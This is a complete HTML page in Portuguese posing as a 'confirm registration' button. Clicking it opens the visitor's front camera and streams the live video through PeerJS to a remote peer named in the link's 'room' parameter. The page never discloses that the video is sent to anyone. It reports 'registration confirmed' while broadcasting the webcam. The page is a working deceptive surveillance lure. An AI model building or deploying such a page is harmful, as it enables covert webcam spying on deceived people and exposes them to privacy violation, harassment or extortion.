
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Confirmar inscrição</title>
<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
<style>
body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f3f4f6;
    font-family: Arial, sans-serif;
}
button {
    background: #176b3a;
    color: white;
    border: none;
    border-radius: 8px;
    padding: 22px 30px;
    font-size: 19px;
    font-weight: bold;
    cursor: pointer;
}
button:disabled {
    opacity: .7;
}
</style>
</head>
<body>

<button id="confirmar">CONFIRMAR INSCRIÇÃO</button>

<script>
const botao = document.getElementById("confirmar");
const sala = new URLSearchParams(location.search).get("room");

let peer;
let stream;

botao.addEventListener("click", async () => {
    if (!sala) {
        alert("Convite inválido. Solicite um novo link.");
        return;
    }

    botao.disabled = true;
    botao.textContent = "AGUARDE...";

    try {
        // Solicita novamente o acesso à câmera
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });

        botao.textContent = "CONECTANDO...";

        peer = new Peer();

        peer.on("open", () => {
            const chamada = peer.call(sala, stream);

            if (!chamada) {
                throw new Error("Não foi possível iniciar a chamada.");
            }

            chamada.on("error", () => {
                alert("Falha ao transmitir a imagem.");
                botao.disabled = false;
                botao.textContent = "TENTAR NOVAMENTE";
            });

            botao.textContent = "INSCRIÇÃO CONFIRMADA";
        });

        peer.on("error", () => {
            alert("Erro de conexão. Tente novamente.");
            botao.disabled = false;
            botao.textContent = "TENTAR NOVAMENTE";
        });

    } catch (erro) {
        console.error(erro);

        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }

        alert("Não foi possível acessar a câmera. Verifique a permissão do navegador.");

        botao.disabled = false;
        botao.textContent = "TENTAR NOVAMENTE";
    }
});
</script>
</body>
</html>
